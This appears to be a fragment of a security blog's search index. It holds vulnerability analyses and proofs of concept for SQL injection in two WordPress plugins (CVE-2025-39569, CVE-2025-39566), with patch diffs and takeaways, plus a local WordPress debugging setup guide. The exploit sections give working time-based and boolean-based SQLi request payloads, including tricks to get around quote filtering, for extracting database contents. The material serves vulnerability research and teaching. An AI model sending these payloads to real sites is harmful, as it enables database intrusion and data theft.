class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL Injection.\nGet First Letter of Database Name To dump all data, the first step is to extract at least one character of the database name. Once retrieved, the rest can be dumped.\nSend a boolean-based SQLi payload with the correct proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name is wordpress, so the first character is w (HEX 0x77).\nSUBSTRING(STRING,1,1) retrieves the first character.\nHere, $proj_id = 4. Since SUBSTRING('wordpress',1,1)=0x77 is true, the IF(condition, value_if_true, value_if_false) returns 4, which exists in the database, so the response contains the project users.\nUsing HEX technique bypasses the esc_sql() function (see Patch Diff) when quotes cannot be used.\nSend a boolean-based SQLi payload with a wrong proj_id:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) With a non-existent proj_id, the response contains None.\n👉 We successfully retrieved the first character of the database name using boolean-based SQLi:\nCorrect proj_id: response without None Wrong proj_id: response contains None Time-based SQLi could also be used, but dumping large data sets would be slow.\nConclusion The CVE-2025-39569 vulnerability in WordPress Taskbuilder arises from the missing single quotes '...' around user input in SQL queries, allowing user data to be interpreted as valid SQL syntax.\nThe patch in v4.0.2 fixed this by wrapping $proj_id in quotes, ensuring it is always treated as a literal string in SQL.\nKey Takeaways:\nPrefer prepared statements ($wpdb-\u0026gt;prepare() in WordPress) over manually inserting variables into queries. For WordPress plugins, thoroughly test Ajax endpoints, as they are the most common sources of SQLi and XSS. Administrators should regularly update plugins/themes to receive security patches promptly. References SQL Injection Cheat Sheet - PortSwigger\nWordPress Taskbuilder \u0026lt;= 4.0.1 Vulnerable to SQL Injection\n","permalink":"//localhost:1313/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eThe vulnerability occurs in the \u003cstrong\u003eTaskbuilder\u003c/strong\u003e WordPress plugin before version \u003cstrong\u003e4.0.2\u003c/strong\u003e. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Taskbuilder Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS Severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e: v4.0.1 (vulnerable) and v4.0.2 (patched)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDiff Tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool that can compare files to see differences between two versions\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe application \u003cstrong\u003esanitizes input data\u003c/strong\u003e before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes \u003ccode\u003e'...'\u003c/code\u003e. This allows an attacker to inject valid SQL syntax (such as \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e, etc.) into the query, resulting in a SQL Injection vulnerability.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"A vulnerability in the Hostel plugin prior to version 1.1.5.7. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed) diff tool: meld or any tool capable of comparing two versions to show differences Analysis The root cause is that the application injects data from a GET request directly into an SQL query while the validation/whitelisting is insufficient.\nPatch Diff Use any diff tool to compare the vulnerable version and the patched version. A clear difference exists in the file controllers/bookings.php\nVulnerable version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Patched version:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 The patch uses a whitelist to restrict which columns can be used for ordering; if the supplied value is not valid it falls back to 'tB.id'.\nAnalysis: The vulnerability appears because the ob parameter is passed directly into the ORDER BY clause after sanitize_text_field(). That function only escapes/cleans text for HTML contexts and does not validate or filter for SQL injection in an SQL context.\nHow it works To inject, we need to identify the complete query used here:\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); The query resides in the default branch of the switch structure.\nAll this logic belongs to the static manage() method of the WPHostelBookings class.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } In WordPress, plugins communicate with core via the Plugin API (Hook System). Therefore, to find where manage() is invoked, we can search for the string \u0026quot;manage\u0026quot; in the plugin folder.\nIn the file models/hostel.php we have:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Here:\nadd_menu_page() creates the main menu in the Admin Dashboard. add_submenu_page() adds submenu items under that menu. The $callback parameter is the callback function invoked when a user clicks the menu/submenu. Example:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() All these menu/submenu items are registered inside the static menu() method of the WPHostel class. To locate where menu() is called, search for the menu hook in the plugin directory.\nIn the plugin root file hostel.php we have:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() is the WordPress Plugin API that attaches a callback to an action hook. The hook name here is admin_menu, meaning WPHostel::menu() will be called during the lifecycle when WordPress builds the Admin Dashboard Menu. Menu in the Admin UI\nDebugging\nThe faulty functionality is in the Booking Manager, so navigate to the Manage Bookings submenu in the Admin UI.\nRight before the default branch there is a comment // list bookings — indicating this code handles listing and ordering bookings.\nOpen your debugger:\nClick Run with Debugger. Set a breakpoint at the switch branch that contains the vulnerable code and at the exact line that assigns the vulnerable value. When you click a column header in the bookings table, observe:\nThe debugger steps into the switch. Use Step Over to reach the default branch. Continue Step Over and inspect variables in Variables \u0026gt; Locals. These variables combine to form the SQL query below. After combining the variables, the full query looks like:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Notably, the $orderby variable is assigned as:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Issues here:\nThe part after ORDER BY uses sanitize_text_field(). That function only cleans HTML, and does not validate or filter input to make it safe in an SQL context. Therefore the ob parameter (provided by the user) can be abused to inject SQL directly. Exploit Detecting SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 We separate the ORDER BY clause with a comma because it accepts multi-column values.\nResult: the response time is delayed → SQL Injection succeeded.\nDumping Data from the Database Bypass ' using ORD():\nTo dump database data we need to extract characters such as the first character of the database name.\nBecause sanitize_text_field() removes single quotes ('), we cannot use payloads relying on '. Instead, use ORD() to compare character ASCII codes:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → we can extract the database name.\nBypass ' using Hex encoding (alternative)\nBesides ORD() we can use Hex encoding to bypass:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Bypass succeeds → database name can be extracted.\nConclusion The vulnerability CVE-2025-39566 in the WordPress Hostel plugin (versions prior to 1.1.5.7) stems from inserting user-supplied input directly into an SQL query without adequate safeguards, leading to SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ protection against SQL Injection Distinguish clearly between input cleaning for HTML contexts and validation/sanitization for SQL contexts References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eA vulnerability in the \u003cstrong\u003eHostel\u003c/strong\u003e plugin prior to version \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Because input is not sanitized properly, this may allow an attacker to interact directly with the database, including but not limited to data exfiltration.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e: v1.1.5.6 (vulnerable) and v1.1.5.7 (fixed)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e or any tool capable of comparing two versions to show differences\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eThe root cause is that the application injects data from a \u003cstrong\u003eGET\u003c/strong\u003e request directly into an SQL query while the validation/whitelisting is insufficient.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\nReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc. Today, more than 40% of websites worldwide run on WordPress. There are two versions of WordPress:\nWordPress.com\nHosting service provided by Automattic You only need to register an account, no installation required Limited customization, advanced features require payment WordPress.org\nOpen-source, you download and install it on your own hosting/server Full customization, install plugins, themes, write code, build any website you want Ecosystem Core: The main CMS Plugins: Add-on software installed on a WordPress site to extend functionality and add new features Themes: Add-on software that defines the visual appearance and layout of a WordPress site Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Currently, over 40% of all websites worldwide run WordPress This means hackers only need to find one common vulnerability =\u0026gt; they can exploit millions of sites at once Like the saying: “fish where the fish are” Plugin and Theme WordPress Core has been reviewed for a long time by thousands of developers and researchers, making it difficult for attackers to break in However, tens of thousands of plugins and themes from various sources are in use, with inconsistent quality Many plugins have poor security code or are no longer updated. Hackers only need to scan plugins/themes for outdated versions and exploit them Setup WordPress for Hacking There are many ways to set up WordPress; searching on Google will show plenty of guides. Here, I’ll set it up on an Ubuntu (22.04) virtual machine:\nNo effect on the host machine’s services WordPress is lightweight enough to run in a VM Install and Configure WordPress Install Dependencies Install the full stack needed to run WordPress (web server + database + PHP + required extensions).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Download and install WordPress source code into the web directory.\n# Create a folder to store the website source code sudo mkdir -p /srv/www # Change owner to www-data, the default user for Apache/Nginx web server sudo chown www-data: /srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it’s usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won’t help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system’s hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB – 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB – 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you’ll see errors like:\n“The uploaded file exceeds the upload_max_filesize directive in php.ini” Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); 👉 It’s recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It’s an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"The vulnerability occurs in the Taskbuilder WordPress plugin before version 4.0.2. This could allow an attacker to directly interact with your database, including, but not limited to, stealing information.\nCVE ID: CVE-2025-39569 Product: WordPress Taskbuilder Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS Severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1 (vulnerable) and v4.0.2 (patched) Diff Tool: meld or any tool that can compare files to see differences between two versions Analysis The application sanitizes input data before using it in SQL queries. However, during query construction, this value is inserted directly without being wrapped in single quotes '...'. This allows an attacker to inject valid SQL syntax (such as OR, AND, etc.) into the query, resulting in a SQL Injection vulnerability.\nPatch Diff Use any diff tool to compare differences between the vulnerable version and the patched version.\nThe clear difference is in the file includes/admin/projects/get_users.php.\nIn version v4.0.1, the variable $proj_id is escaped but inserted directly into the query without quotes:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); In version v4.0.2, the query is adjusted to wrap $proj_id in quotes after escaping:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); This patch ensures that the $proj_id value after escaping is treated as a literal string, preventing it from escaping the quotes to inject SQL syntax, effectively mitigating the SQL Injection.\nHow It Works File Architecture:\nGeneral structure of the current file:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Start buffer to generate the main modal content ob_start(); // ... render HTML user list $body = ob_get_clean(); // Start buffer to generate modal footer ob_start(); // ... render HTML buttons (Close, Save) $footer = ob_get_clean(); // Return JSON data for frontend modal rendering echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Fetch project data from the database. ob_start() / ob_get_clean(): Buffer HTML output instead of printing directly, storing it in a variable. $body / $footer: Contain dynamic HTML for the modal. json_encode(): Returns JSON to the client, often used in Ajax to render modals without refreshing the page. The file is located in includes, suggesting it’s called from another feature. To find where it’s used, search for get_users.php in the plugin directory.\n👉 It is included in the function wppm_get_users() of the class WPPM_Admin in class-wppm-admin.php. wppm_get_users() is a callback for a WordPress action hook.\nWPPM_Admin constructor:\nfinal class WPPM_Admin { public function __construct() { // other actions add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;, array($this,\u0026#39;wppm_get_users\u0026#39;)); // other actions } } add_action() is a WordPress Plugin API method to attach a callback to an action hook.\nwp_ajax_wppm_get_users is an Ajax hook name:\nwp_ajax_{action} → handles Ajax for logged-in users. wp_ajax_nopriv_{action} → handles Ajax for non-logged-in users. Here, action = wppm_get_users. If you send action=wppm_get_users via Ajax to admin-ajax.php, WordPress will execute the corresponding callback, here wppm_get_users().\n👉 Knowing action = wppm_get_users, you can find which Ajax requests use it by searching wppm_get_users in .js files of the plugin.\nThe wppm_get_users action is the data part in the POST request handled by wppm_get_users().\nThe function is referenced in HTML attributes of the project feature:\nCreate a new project Access that project Inspect code to locate wppm_get_users and see which actions call it 👉 Clicking the icon next to Users triggers Ajax, sending a request to the server to fetch project users and render them in HTML.\nExploit Detect SQLi Capture requests using BurpSuite and send a time-based SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Response delay indicates a successful SQL 